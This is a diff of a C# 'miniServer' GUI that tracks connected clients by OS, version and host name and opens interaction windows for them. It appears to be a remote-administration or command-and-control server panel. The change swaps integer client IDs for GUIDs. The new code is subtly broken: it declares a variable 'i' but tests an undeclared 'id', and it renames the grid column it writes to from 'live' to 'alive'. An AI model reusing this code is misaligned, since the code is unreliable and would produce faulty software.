@@ -134,7 +134,7 @@ namespace miniServer
         void AddNewClienet(TcpClient tcpClient, string os, string version, string hostName, string incomming)
         {
             idMutex.WaitOne();
-            miniClient mc = new miniClient(clientList.Count, tcpClient, os, version, hostName);
+            miniClient mc = new miniClient(Guid.NewGuid(), tcpClient, os, version, hostName);
             clientList.Add(mc);
             idMutex.ReleaseMutex();
 
@@ -202,9 +202,9 @@ namespace miniServer
         {
             if(dataGridViewClients.CurrentCell != null)
             {
-                int i = (int)dataGridViewClients.CurrentRow.Cells[1].Value;
+                Guid i = (Guid)dataGridViewClients.CurrentRow.Cells[1].Value;
 
-                if (clientList[i].Interact)
+                if (clientList.FirstOrDefault(e=>e.ID.ToString()==id.ToString()).Interact)
                 {
                    // if (disableOpenWarningToolStripMenuItem.Checked)
                         MessageBox.Show("Client is already open in another interact form.", "Client is open", MessageBoxButtons.OK,MessageBoxIcon.Error);
@@ -223,13 +223,13 @@ namespace miniServer
                             }
                         }
                 }
-                if (!clientList[i].IsAlive)
+                if (clientList.Any(e=>e.ID.ToString()==id.ToString() && !e.IsAlive))
                 {
                     if (MessageBox.Show("It seems the client not available, do you want to interact with it?", "Client is not alive", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.No)
                         return;
                 }
 
-                InteractForm f = new InteractForm(clientList[i], separator);
+                InteractForm f = new InteractForm(clientList.FirstOrDefault(e => e.ID.ToString() == id.ToString()), separator);
                 f.Show();
             }
 
@@ -338,7 +338,7 @@ namespace miniServer
                     gridMutex.WaitOne();
                     dataGridViewClients.Invoke((MethodInvoker)delegate
                     {
-                        dataGridViewClients["live", mc.ID].Value = "NO";
+                        dataGridViewClients.Rows.Cast<DataGridViewRow>().Where(r => r.Cells[1].Value.ToString().Equals(mc.ID.ToString())).FirstOrDefault().Cells["alive"].Value = "NO";
                     });
                     gridMutex.ReleaseMutex();
 
